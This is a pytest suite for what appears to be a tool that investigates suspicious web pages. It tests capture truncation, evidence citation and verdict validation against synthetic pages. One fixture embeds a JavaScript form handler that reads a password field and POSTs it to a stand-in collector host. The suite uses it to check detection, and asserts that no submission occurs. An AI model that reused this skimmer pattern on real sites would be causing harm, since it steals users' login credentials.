"""Synthetic regressions for partial captures; no external datasets or target URLs."""

import copy
import json

import pytest
from browser_guard import PinnedResponse
from case_contract import Assessment
from evidence_items import build_evidence_items
from research_case import add_probe, assess_case, new_case

from .test_case_capture_browser import FixtureTransport
from .test_case_capture_browser import capture_fixture as browser_capture_fixture

capture_fixture = browser_capture_fixture


def page(monkeypatch, html):
    def fetch(self, request, decision, config=None):
        self.requests.append((request.method, request.url))
        return PinnedResponse(
            200, {"content-type": "text/html"}, html.encode(), "93.184.216.34"
        )

    monkeypatch.setattr(FixtureTransport, "fetch", fetch)


def adverse(observation, *, item="script-001"):
    return {
        "verdict": "malicious",
        "assessor": "synthetic-regression",
        "findings": [
            {
                "kind": "credential_collection",
                "basis": "observation",
                "statement": "The complete captured handler declares sending a password to an unrelated collection endpoint; no submission occurred.",
                "evidence_ids": [observation["id"]],
                "evidence_refs": [
                    {"observation_id": observation["id"], "item_id": item}
                ],
            }
        ],
        "limitations": [
            "Synthetic example. Other scripts are outside the captured budget. No form submitted."
        ],
    }


def test_prioritize_and_preserve_handler_beyond_old_cutoff(
    monkeypatch, capture_fixture, tmp_path
):
    filler = "<script>/* documentation bootstrap */</script>" * 22
    handler = (
        "/*"
        + "synthetic padding " * 100
        + "*/\n"
        + """
      document.forms[0].addEventListener('submit', e => {
        e.preventDefault();
        fetch('https://collector.test/collect', {method:'POST', body:document.querySelector('input').value});
      });"""
    )
    page(
        monkeypatch,
        '<body>Untrusted verification example<form><input type="password"></form>'
        + filler
        + "<script>"
        + handler
        + "</script>",
    )
    capture, _, transports = capture_fixture
    out = tmp_path / "partial"
    new_case(out, "https://public.test/")
    c = add_probe(out, "https://public.test/", capture=capture)
    o = c["observations"][0]
    assert o["status"] == "partial"  # the omitted scripts remain a coverage gap
    assert o["scripts"][0]["inline"] == handler
    assert not o["scripts"][0]["truncated"]
    assert o["scripts"][0]["document_index"] == 22
    assert not any(method == "POST" for method, _ in transports[-1].requests)
    c = assess_case(out, adverse(o))
    assert c["assessment"]["verdict"] == "malicious"
    assert c["collection"]["coverage"] == "partial"
    assert "items: obs-001/script-001" in (out / "report.md").read_text()


def test_truncated_handler_remains_citable_without_hiding_truncation(
    monkeypatch, capture_fixture, tmp_path
):
    page(
        monkeypatch,
        '<body>Example<form><input type="password"></form><script>/* password '
        + "padding " * 5000
        + "*/</script>",
    )
    out = tmp_path / "truncated"
    new_case(out, "https://public.test/")
    c = add_probe(out, "https://public.test/", capture=capture_fixture[0])
    assert len(c["observations"][0]["scripts"][0]["inline"]) == 32768
    result = assess_case(out, adverse(c["observations"][0]))
    assert result["assessment"]["verdict"] == "malicious"
    assert result["observations"][0]["scripts"][0]["truncated"]


def partial_observation():
    o = {
        "id": "obs-001",
        "status": "partial",
        "http_status": 200,
        "errors": ["page_capture_truncated"],
        "screenshot": "obs-001.png",
        "screenshot_sha256": "a" * 64,
        "dom_snapshot": "obs-001-dom.txt",
        "scripts": [
            {"inline": "/* complete synthetic password handler */", "truncated": False}
        ],
        "forms": [{"fields": [{"type": "password"}], "fields_truncated": False}],
        "visible_text": "Synthetic verification",
        "counts": {"text_chars": 22},
    }
    o["evidence_items"] = build_evidence_items(o)
    return o


@pytest.mark.parametrize(
    "error",
    [
        "challenge_or_interstitial",
        "navigation:Error",
        "capture:Error",
        "session_cleanup_unconfirmed",
    ],
)
def test_capture_errors_are_evidence_not_verdict_vetoes(error):
    o = partial_observation()
    o["errors"].append(error)
    Assessment.model_validate(adverse(o)).validate_evidence([o])


def test_failed_pages_are_citable_but_changed_or_invented_items_are_refused():
    o = partial_observation()
    for change in ({"status": "failed"}, {"http_status": 500}):
        Assessment.model_validate(adverse(o)).validate_evidence([{**o, **change}])
    altered = copy.deepcopy(o)
    altered["scripts"][0]["inline"] += "changed"
    with pytest.raises(ValueError, match="changed evidence"):
        Assessment.model_validate(adverse(o)).validate_evidence([altered])
    with pytest.raises(ValueError, match="Unknown"):
        Assessment.model_validate(adverse(o, item="script-999")).validate_evidence([o])
    value = adverse(o)
    value["findings"][0]["evidence_refs"] = []
    Assessment.model_validate(value).validate_evidence([o])


def test_partial_capture_does_not_determine_the_verdict():
    o = partial_observation()
    value = adverse(o)
    value["verdict"] = "no_adverse_behavior_observed"
    Assessment.model_validate(value).validate_evidence([o])


def test_legitimate_third_party_login_does_not_automatically_become_malicious(
    monkeypatch, capture_fixture, tmp_path
):
    page(
        monkeypatch,
        "<body>Example service uses our verified identity provider for authentication."
        '<form action="https://identity.test/login" method="POST"><input type="password"></form>',
    )
    out = tmp_path / "legitimate"
    new_case(out, "https://public.test/")
    c = add_probe(out, "https://public.test/", capture=capture_fixture[0])
    assert c["assessment"]["verdict"] is None
    value = {
        "verdict": "no_adverse_behavior_observed",
        "assessor": "synthetic-regression",
        "findings": [
            {
                "kind": "benign_context",
                "basis": "observation",
                "statement": "The observed provider relationship matches the researcher-supplied synthetic scenario.",
                "evidence_ids": ["obs-001"],
            }
        ],
    }
    assert (
        assess_case(out, value)["assessment"]["verdict"]
        == "no_adverse_behavior_observed"
    )


def test_dns_failure_is_terminal_with_a_valid_empty_assessment(tmp_path):
    import domain_investigation as cli
    from browser_guard import DestinationRefused
    from denylist import DenylistResult

    calls = []

    def refuse(operation, payload):
        calls.append(operation)
        raise DestinationRefused(
            payload["url"],
            DenylistResult(
                allowed=False,
                reason="Synthetic DNS failure",
                reason_code="resolution_failed",
            ),
        )

    out = tmp_path / "unavailable"
    c = cli.start(
        out, "https://unavailable.test/", "Inspect this test page", request=refuse
    )
    s = cli.status(c)
    assert s["terminal"] and not s["assessment_required"]
    assert s["collection"] == {
        "execution": "unavailable",
        "coverage": "none",
        "observations": 0,
        "successful_pages": 0,
    }
    assert s["valid_evidence_ids"] == []
    assert s["assessment"] is None and s["assessment_status"] == "pending"
    assert calls == ["start"]
    contract = cli.assessment_contract(c)
    assert "EvidenceReference" in contract["assessment_schema"]["$defs"]
    assert "unavailable" in (out / "report.md").read_text()
    assert json.loads((out / "case.json").read_text())["stop_reason"]
